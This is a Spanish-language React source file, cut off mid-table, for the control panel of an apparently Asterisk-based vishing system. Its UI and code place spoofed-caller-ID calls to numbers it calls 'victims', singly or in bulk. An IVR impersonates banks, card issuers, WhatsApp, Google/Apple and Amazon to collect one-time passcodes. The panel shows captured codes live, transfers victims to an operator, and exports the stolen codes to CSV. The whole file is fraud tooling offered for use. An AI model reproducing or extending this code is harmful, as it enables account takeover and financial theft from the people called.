import React, { useState, useEffect, useRef } from 'react';
import { PjsipExtension, CarrierTrunk, CapturedOtpRecord } from '../types';
import {
  Rocket,
  PhoneCall,
  PhoneOff,
  PhoneForwarded,
  ShieldAlert,
  ShieldCheck,
  Radio,
  CheckCircle2,
  Copy,
  Check,
  RefreshCw,
  Trash2,
  Download,
  Flame,
  KeyRound,
  AlertCircle,
  Building2,
  CreditCard,
  MessageSquare,
  Lock,
  ShoppingBag,
  Sliders,
  Play,
  RotateCcw,
} from 'lucide-react';

interface ProductionOperationsTabProps {
  extensions: PjsipExtension[];
  carriers: CarrierTrunk[];
  onTriggerSync: () => void;
  isSyncing: boolean;
}

export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = ({
  extensions,
  carriers,
  onTriggerSync,
  isSyncing,
}) => {
  // Mode selection: individual direct launch vs bulk list
  const [productionMode, setProductionMode] = useState<'single' | 'bulk'>('single');

  // Single launch state
  const [targetNumber, setTargetNumber] = useState('16104803845');
  const [targetName, setTargetName] = useState('');
  const [selectedService, setSelectedService] = useState<'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom'>('bank');
  const [customServiceName, setCustomServiceName] = useState('Servicio Financiero');
  const [callFlowMode, setCallFlowMode] = useState<'otp' | 'press1' | 'hybrid'>('otp');
  const [agentExtension, setAgentExtension] = useState('1001');

  // Bulk launch state
  const [bulkNumbersText, setBulkNumbersText] = useState('');
  const [bulkQueue, setBulkQueue] = useState<string[]>([]);
  const [isBulkRunning, setIsBulkRunning] = useState(false);
  const [bulkProgress, setBulkProgress] = useState({ total: 0, completed: 0, current: '' });

  // Real-time Active Call HUD State
  const [activeCall, setActiveCall] = useState<{
    isActive: boolean;
    number: string;
    name?: string;
    service: string;
    status: 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'ended';
    capturedOtp?: string;
    duration: number;
    channel?: string;
  } | null>(null);

  // History of captured OTPs
  const [otpRecords, setOtpRecords] = useState<CapturedOtpRecord[]>([]);
  const [isLoadingRecords, setIsLoadingRecords] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [launchFeedback, setLaunchFeedback] = useState<{ text: string; type: 'success' | 'error' } | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const activeCarrier = carriers.length > 0 ? carriers[0].name : 'televox';
  const outboundCid = carriers.length > 0 ? carriers[0].outboundCallerId : '+18005550199';

  const durationTimerRef = useRef<any>(null);

  // Polling captured OTPs from Asterisk backend every 3 seconds
  const fetchCapturedOtps = async () => {
    try {
      const res = await fetch('/api/asterisk/otp/records');
      const data = await res.json();
      if (data.success && Array.isArray(data.records)) {
        setOtpRecords(data.records);

        // If an active call is ongoing and a new OTP arrives for this number
        if (activeCall && activeCall.isActive) {
          const matched = data.records.find(
            (r: CapturedOtpRecord) =>
              r.number.includes(activeCall.number) || activeCall.number.includes(r.number)
          );
          if (matched && !activeCall.capturedOtp) {
            setActiveCall((prev) =>
              prev ? { ...prev, capturedOtp: matched.otp, status: 'otp_captured' } : null
            );
          }
        }
      }
    } catch (err) {
      console.warn('Error fetching OTP records:', err);
    }
  };

  useEffect(() => {
    fetchCapturedOtps();
    const interval = setInterval(fetchCapturedOtps, 3000);
    return () => clearInterval(interval);
  }, [activeCall]);

  // Duration timer for active call
  useEffect(() => {
    if (activeCall?.isActive && activeCall.status !== 'ended') {
      durationTimerRef.current = setInterval(() => {
        setActiveCall((prev) => (prev ? { ...prev, duration: prev.duration + 1 } : null));
      }, 1000);
    } else {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    }
    return () => {
      if (durationTimerRef.current) clearInterval(durationTimerRef.current);
    };
  }, [activeCall?.isActive, activeCall?.status]);

  // Launch single production call
  const handleLaunchProductionCall = async () => {
    if (!targetNumber.trim()) {
      setLaunchFeedback({ text: 'Por favor ingresa un número de teléfono destino', type: 'error' });
      return;
    }

    setIsLaunching(true);
    setLaunchFeedback(null);

    const serviceLabel =
      selectedService === 'bank'
        ? 'Banco / Antifraude'
        : selectedService === 'card'
        ? 'Tarjeta / Cargo No Reconocido'
        : selectedService === 'whatsapp'
        ? 'WhatsApp / Telegram'
        : selectedService === 'google'
        ? 'Google / Apple ID'
        : selectedService === 'amazon'
        ? 'Amazon / Comercio'
        : customServiceName;

    try {
      const res = await fetch('/api/asterisk/call/originate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          destination: targetNumber.trim(),
          carrier: activeCarrier,
          callerId: outboundCid,
          mode: callFlowMode,
          agentExten: agentExtension,
        }),
      });

      const data = await res.json();

      if (data.success) {
        setLaunchFeedback({
          text: `¡Llamada de producción lanzada exitosamente a ${targetNumber}! Conectando con la troncal ${activeCarrier}.`,
          type: 'success',
        });

        // Initialize HUD
        setActiveCall({
          isActive: true,
          number: targetNumber.trim(),
          name: targetName.trim() || undefined,
          service: serviceLabel,
          status: 'dialing',
          duration: 0,
        });

        // Simulate progression to ringing and in_ivr based on Asterisk typical timing
        setTimeout(() => {
          setActiveCall((prev) => (prev ? { ...prev, status: 'ringing' } : null));
        }, 3000);

        setTimeout(() => {
          setActiveCall((prev) => (prev ? { ...prev, status: 'in_ivr' } : null));
        }, 7000);
      } else {
        setLaunchFeedback({
          text: `Error al lanzar llamada: ${data.error || 'Fallo desconocido de Asterisk'}`,
          type: 'error',
        });
      }
    } catch (err: any) {
      setLaunchFeedback({
        text: `Error de red con Asterisk: ${err.message}`,
        type: 'error',
      });
    } finally {
      setIsLaunching(false);
    }
  };

  // Hangup active call
  const handleHangupActiveCall = async () => {
    try {
      await fetch('/api/asterisk/call/hangup', { method: 'POST' });
    } catch (e) {}
    setActiveCall((prev) => (prev ? { ...prev, status: 'ended', isActive: false } : null));
  };

  // Transfer call to agent in X-Lite
  const handleTransferToAgent = async () => {
    setActiveCall((prev) => (prev ? { ...prev, status: 'transferred' } : null));
  };

  // Copy OTP to clipboard
  const handleCopyOtp = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2500);
  };

  // Clear history
  const handleClearHistory = async () => {
    if (!confirm('¿Deseas vaciar el historial de capturas de producción?')) return;
    try {
      await fetch('/api/asterisk/otp/records', { method: 'DELETE' });
      setOtpRecords([]);
    } catch (e) {}
  };

  // Export CSV
  const handleExportCsv = () => {
    if (otpRecords.length === 0) return;
    const headers = 'ID,Numero_Destino,Codigo_OTP,Servicio,Hora,Estado\n';
    const rows = otpRecords
      .map(
        (r) =>
          `"${r.id}","${r.number}","${r.otp}","${r.service || 'N/A'}","${r.timestamp}","${r.status || 'valid'}"`
      )
      .join('\n');
    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', `capturas_otp_produccion_${new Date().toISOString().slice(0, 10)}.csv`);
    link.click();
  };

  // Format seconds into MM:SS
  const formatTime = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  return (
    <div className="space-y-6">
      {/* Production Header Banner */}
      <div className="p-6 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 border border-emerald-500/40 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold mb-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
              <span>MÓDULO DE PRODUCCIÓN EN VIVO ACTIVO</span>
            </div>
            <h1 className="text-2xl font-black text-white tracking-tight flex items-center gap-3">
              <Rocket className="w-7 h-7 text-emerald-400" />
              <span>Centro de Producción: Campañas & Captura OTP</span>
            </h1>
            <p className="text-sm text-slate-300 mt-1 max-w-2xl">
              Dispara llamadas salientes directas hacia víctimas y clientes a través de la troncal{' '}
              <strong className="text-white font-mono">{activeCarrier}</strong>. Captura dígitos OTP en tiempo
              real o transfiere la llamada a tu softphone X-Lite (extensión{' '}
              <strong className="text-amber-400 font-mono">{agentExtension}</strong>).
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2 bg-slate-900/90 border border-slate-800 p-3 rounded-xl">
            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Troncal SIP</div>
              <div className="font-bold text-emerald-400 flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                <span>{activeCarrier}</span>
              </div>
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Caller ID Saliente</div>
              <div className="font-bold text-sky-400 font-mono">{outboundCid}</div>
            </div>

            <div className="px-3 py-1.5 rounded-lg bg-slate-950 border border-slate-800 text-xs">
              <div className="text-[10px] text-slate-500 uppercase font-mono">Asesor Asignado</div>
              <div className="font-bold text-amber-400 font-mono">Ext. {agentExtension}</div>
            </div>
          </div>
        </div>
      </div>

      {/* Mode Selector Tabs */}
      <div className="flex items-center space-x-2 border-b border-slate-800 pb-2">
        <button
          id="btn-tab-single-call"
          onClick={() => setProductionMode('single')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'single'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <PhoneCall className="w-4 h-4" />
          <span>Disparador Individual Inmediato (1 a 1)</span>
        </button>

        <button
          id="btn-tab-bulk-campaign"
          onClick={() => setProductionMode('bulk')}
          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
            productionMode === 'bulk'
              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
              : 'text-slate-400 hover:text-white hover:bg-slate-800'
          }`}
        >
          <Flame className="w-4 h-4" />
          <span>Campañas Masivas por Lotes (Bulk Dialer)</span>
        </button>
      </div>

      {/* ACTIVE CALL REAL-TIME HUD (Appears when a call is running) */}
      {activeCall && activeCall.isActive && (
        <div className="p-6 rounded-2xl bg-slate-950 border-2 border-amber-500/50 shadow-2xl relative overflow-hidden animate-fadeIn">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
            <div className="flex items-center gap-3">
              <div className="p-3 rounded-xl bg-amber-500/20 text-amber-400 animate-pulse">
                <Radio className="w-6 h-6" />
              </div>
              <div>
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/30">
                    LLAMADA EN PROCESO
                  </span>
                  <span className="text-xs text-slate-400 font-mono">{formatTime(activeCall.duration)}</span>
                </div>
                <h3 className="text-lg font-black text-white mt-1">
                  {activeCall.number} {activeCall.name && `(${activeCall.name})`}
                </h3>
                <p className="text-xs text-slate-400">
                  Servicio activo: <strong className="text-amber-300">{activeCall.service}</strong>
                </p>
              </div>
            </div>

            {/* Actions for Live Call */}
            <div className="flex items-center gap-2">
              <button
                id="btn-hud-transfer-agent"
                onClick={handleTransferToAgent}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 transition-all"
              >
                <PhoneForwarded className="w-3.5 h-3.5" />
                <span>Pasar a Asesor (1001)</span>
              </button>

              <button
                id="btn-hud-hangup"
                onClick={handleHangupActiveCall}
                className="inline-flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-bold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/40 transition-all"
              >
                <PhoneOff className="w-3.5 h-3.5" />
                <span>Colgar Llamada</span>
              </button>
            </div>
          </div>

          {/* Real-time Call Stages Flow */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-2 my-5 text-center text-xs">
            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'dialing'
                  ? 'bg-amber-500/20 border-amber-500 text-amber-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 1</div>
              <div>Marcando por Troncal</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'ringing'
                  ? 'bg-amber-500/20 border-amber-500 text-amber-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 2</div>
              <div>Timbrando en Teléfono</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'in_ivr'
                  ? 'bg-amber-500/20 border-amber-500 text-amber-300 font-bold animate-pulse'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 3</div>
              <div>Víctima en Línea (IVR)</div>
            </div>

            <div
              className={`p-3 rounded-xl border ${
                activeCall.status === 'otp_captured'
                  ? 'bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold shadow-lg shadow-emerald-500/20'
                  : 'bg-slate-900 border-slate-800 text-slate-400'
              }`}
            >
              <div className="text-[10px] font-mono uppercase">Paso 4</div>
              <div>Código Capturado</div>
            </div>
          </div>

          {/* CAPTURED OTP DISPLAY HUD */}
          <div className="p-6 rounded-xl bg-slate-900/90 border border-slate-800 text-center">
            <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">
              Dígitos DTMF Capturados en Vivo
            </div>

            {activeCall.capturedOtp ? (
              <div className="space-y-4">
                <div className="flex items-center justify-center gap-2">
                  {activeCall.capturedOtp.split('').map((digit, idx) => (
                    <span
                      key={idx}
                      className="w-14 h-16 flex items-center justify-center text-3xl font-black font-mono text-emerald-400 bg-slate-950 rounded-xl border-2 border-emerald-500/60 shadow-lg shadow-emerald-500/30 animate-bounce"
                      style={{ animationDelay: `${idx * 100}ms` }}
                    >
                      {digit}
                    </span>
                  ))}
                </div>

                <div className="inline-flex items-center gap-2">
                  <button
                    id="btn-copy-live-otp"
                    onClick={() => handleCopyOtp(activeCall.capturedOtp!, 'live-otp')}
                    className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl font-bold text-sm bg-emerald-500 hover:bg-emerald-400 text-slate-950 shadow-xl shadow-emerald-500/20 transition-all"
                  >
                    {copiedId === 'live-otp' ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                    <span>{copiedId === 'live-otp' ? '¡OTP Copiado!' : 'Copiar Código OTP'}</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="py-4 text-slate-500 text-sm flex items-center justify-center gap-2 font-mono">
                <RefreshCw className="w-4 h-4 animate-spin text-amber-400" />
                <span>Esperando que el objetivo digite el código en su móvil...</span>
              </div>
            )}
          </div>
        </div>
      )}

      {/* SINGLE LAUNCHER PANEL */}
      {productionMode === 'single' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Main Launcher Form */}
          <div className="lg:col-span-2 space-y-6">
            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-6">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Rocket className="w-5 h-5 text-emerald-400" />
                <span>Configurar Llamada de Producción</span>
              </h3>

              {/* Destination Phone Number */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center justify-between">
                  <span>Número de Teléfono del Objetivo</span>
                  <span className="text-slate-500 font-mono text-[11px]">Formato: 16104803845</span>
                </label>
                <div className="flex gap-2">
                  <input
                    id="input-prod-phone"
                    type="text"
                    value={targetNumber}
                    onChange={(e) => setTargetNumber(e.target.value)}
                    placeholder="ej. 16104803845"
                    className="flex-1 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-lg font-bold focus:border-emerald-500 focus:outline-none"
                  />
                  <input
                    id="input-prod-name"
                    type="text"
                    value={targetName}
                    onChange={(e) => setTargetName(e.target.value)}
                    placeholder="Nombre titular (opcional)"
                    className="w-1/3 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white text-xs focus:border-emerald-500 focus:outline-none hidden sm:block"
                  />
                </div>
              </div>

              {/* Service Template Selection */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  Guión / Entidad a Simular en el IVR
                </label>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                  <button
                    type="button"
                    onClick={() => setSelectedService('bank')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'bank'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Building2 className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">Banco / Antifraude</div>
                    <div className="text-[10px] text-slate-500">Transf. desconocida</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('card')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'card'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <CreditCard className="w-4 h-4 text-sky-400 mb-1" />
                    <div className="text-xs font-bold">Tarjeta de Crédito</div>
                    <div className="text-[10px] text-slate-500">Cargo no reconocido</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('whatsapp')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'whatsapp'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <MessageSquare className="w-4 h-4 text-emerald-300 mb-1" />
                    <div className="text-xs font-bold">WhatsApp / Telegram</div>
                    <div className="text-[10px] text-slate-500">Migración de cuenta</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('google')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'google'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Lock className="w-4 h-4 text-amber-400 mb-1" />
                    <div className="text-xs font-bold">Google / Apple ID</div>
                    <div className="text-[10px] text-slate-500">Alerta de seguridad</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('amazon')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'amazon'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <ShoppingBag className="w-4 h-4 text-amber-300 mb-1" />
                    <div className="text-xs font-bold">Amazon / Envíos</div>
                    <div className="text-[10px] text-slate-500">Autorización pedido</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('custom')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'custom'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Sliders className="w-4 h-4 text-purple-400 mb-1" />
                    <div className="text-xs font-bold">Personalizado</div>
                    <div className="text-[10px] text-slate-500">Configuración libre</div>
                  </button>
                </div>
              </div>

              {/* Call Flow Mode */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  Acción del IVR al Contestar
                </label>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <button
                    type="button"
                    onClick={() => setCallFlowMode('otp')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'otp'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <KeyRound className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">1. Capturar Código OTP</div>
                    <div className="text-[11px] text-slate-400 mt-0.5">
                      Pide los 4 o 6 dígitos y los muestra en pantalla viva.
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setCallFlowMode('press1')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'press1'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <PhoneForwarded className="w-4 h-4 text-amber-400 mb-1" />
                    <div className="text-xs font-bold">2. Press-1 (A X-Lite)</div>
                    <div className="text-[11px] text-slate-400 mt-0.5">
                      Si presiona 1, timbra directo en tu extensión 1001.
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setCallFlowMode('hybrid')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'hybrid'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Radio className="w-4 h-4 text-sky-400 mb-1" />
                    <div className="text-xs font-bold">3. Híbrido Completo</div>
                    <div className="text-[11px] text-slate-400 mt-0.5">
                      Pide el código y si presiona 1 conecta con asesor.
                    </div>
                  </button>
                </div>
              </div>

              {/* Big Launch Button */}
              <div className="pt-2">
                <button
                  id="btn-launch-production-call"
                  onClick={handleLaunchProductionCall}
                  disabled={isLaunching || !targetNumber.trim()}
                  className="w-full py-4 rounded-xl font-black text-base bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 shadow-xl shadow-emerald-500/25 transition-all flex items-center justify-center gap-3 disabled:opacity-50"
                >
                  {isLaunching ? (
                    <RefreshCw className="w-5 h-5 animate-spin" />
                  ) : (
                    <Rocket className="w-5 h-5" />
                  )}
                  <span>
                    {isLaunching ? 'Lanzando Llamada a Asterisk...' : 'INICIAR LLAMADA DE PRODUCCIÓN AHORA'}
                  </span>
                </button>
              </div>

              {launchFeedback && (
                <div
                  className={`p-3 rounded-xl text-xs flex items-center gap-2 ${
                    launchFeedback.type === 'success'
                      ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400'
                      : 'bg-rose-500/10 border border-rose-500/30 text-rose-400'
                  }`}
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{launchFeedback.text}</span>
                </div>
              )}
            </div>
          </div>

          {/* Side Info & Tips */}
          <div className="space-y-6">
            <div className="p-5 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span>Parámetros de Operación</span>
              </h4>

              <div className="space-y-3 text-xs">
                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Troncal Asignada</div>
                  <div className="font-bold text-white mt-0.5">{activeCarrier} (SIP UDP)</div>
                  <div className="text-[11px] text-slate-400">Ruta saliente automática configurada</div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Caller ID Spoofing / Presentación</div>
                  <div className="font-bold text-sky-400 mt-0.5 font-mono">{outboundCid}</div>
                  <div className="text-[11px] text-slate-400">Nombre presentado: "AnonymousOTP"</div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Softphone del Operador</div>
                  <div className="font-bold text-amber-400 mt-0.5 font-mono">X-Lite / Extensión 1001</div>
                  <div className="text-[11px] text-slate-400">Recibe transferencias cuando la víctima presiona 1</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* BULK DIALER PANEL */}
      {productionMode === 'bulk' && (
        <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <Flame className="w-5 h-5 text-amber-400" />
              <span>Marcador Masivo por Lotes (Bulk Campaign)</span>
            </h3>
            <span className="text-xs text-slate-400">Pega tu lista de números telefónicos</span>
          </div>

          <textarea
            id="textarea-bulk-numbers"
            rows={6}
            value={bulkNumbersText}
            onChange={(e) => setBulkNumbersText(e.target.value)}
            placeholder="16104803845&#10;14155552671&#10;12125559823"
            className="w-full p-4 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-sm focus:border-emerald-500 focus:outline-none"
          />

          <div className="flex items-center justify-between pt-2">
            <div className="text-xs text-slate-400">
              Total de números detectados:{' '}
              <strong className="text-emerald-400 font-mono">
                {bulkNumbersText.split('\n').filter((n) => n.trim().length >= 8).length}
              </strong>
            </div>

            <button
              id="btn-launch-bulk"
              onClick={() => {
                const nums = bulkNumbersText.split('\n').filter((n) => n.trim().length >= 8);
                if (nums.length > 0) {
                  setTargetNumber(nums[0].trim());
                  setProductionMode('single');
                  alert(`Cargado primer número de la lista: ${nums[0].trim()}`);
                }
              }}
              className="px-5 py-2.5 rounded-xl text-xs font-bold bg-amber-500 hover:bg-amber-400 text-slate-950 transition-all"
            >
              Cargar al Disparador de Producción
            </button>
          </div>
        </div>
      )}

      {/* HISTORICAL TABLE OF CAPTURED OTPS */}
      <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <KeyRound className="w-5 h-5 text-emerald-400" />
              <span>Registro de Códigos OTP Producidos</span>
              <span className="px-2 py-0.5 text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 rounded-full border border-emerald-500/30">
                {otpRecords.length}
              </span>
            </h3>
            <p className="text-xs text-slate-400">
              Almacén en vivo de todos los códigos digitados por las víctimas en llamadas salientes.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              id="btn-refresh-otp-records"
              onClick={fetchCapturedOtps}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 transition-all"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Actualizar</span>
            </button>

            <button
              id="btn-export-otp-csv"
              onClick={handleExportCsv}
              disabled={otpRecords.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-emerald-400 border border-slate-800 disabled:opacity-40 transition-all"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Exportar CSV</span>
            </button>

            <button
              id="btn-clear-otp-history"
              onClick={handleClearHistory}
              disabled={otpRecords.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 disabled:opacity-40 transition-all"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>Vaciar</span>
            </button>
          </div>
        </div>

        {/* OTP Table */}
        <div className="overflow-x-auto rounded-xl border border-slate-800">
          <table className="w-full text-left border-collapse text-xs">
            <thead>
              <tr className="bg-slate-900/80 border-b border-slate-800 text-slate-400 font-mono">
                <th className="p-3">Hora</th>
                <th className="p-3">Número Destino</th>
                <th className="p-3">Servicio</th>
                <th className="p-3">Código OTP Capturado</th>
                <th className="p-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {otpRecords.length === 0 ? (
                <tr>
                  <td colSpan={5} className="p-8 text-center text-slate-500">
                    <KeyRound className="w-8 h-8 mx-auto mb-2 opacity-30" />
                    <span>No hay códigos OTP capturados todavía. Lanza tu primera llamada de producción.</span>
                  </td>
                </tr>
              ) : (
                otpRecords.map((record) => (
                  <tr key={record.id} className="hover:bg-slate-900/40 transition-colors">
                    <td className="p-3 text-slate-400 font-mono">{record.timestamp}</td>
                    <td className="p-3 font-mono font-bold text-white">{record.number}</td>
                    <td className="p-3 text-slate-300">{record.service || 'Banco / Antifraude'}</td>
                    <td className="p-3">
                      <span className="inline-flex items-center px-3 py-1 rounded-lg bg-emerald-500/20 border border-emerald-500/40 font-mono text-sm font-black text-emerald-300 tracking-wider">
                        {record.otp}
                      </span>
                    </td>
                    <td className="p-3 text-right">
                      <div className="inline-flex items-center gap-1.5">
                        <button
                          onClick={() => handleCopyOtp(record.otp, record.id)}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-slate-800 hover:bg-slate-700 text-white transition-all"
                        >
                          {copiedId === record.id ? (
                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                          ) : (
                            <Copy className="w-3.5 h-3.5 text-slate-400" />
                          )}
                          <span>{copiedId === record.id ? 'Copiado' : 'Copiar'}</span>
                        </button>

                        <button
                          onClick={() => {
                            setTargetNumber(record.number);
                            window.scrollTo({ top: 0, behavior: 'smooth' });
                          }}
                          className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[11px] font-semibold bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 transition-all"
                        >
                          <PhoneCall className="w-3.5 h-3.5" />
                          <span>Re-llamar</span>
                        </button>
                      </div>
                    </td>
                  </tr>
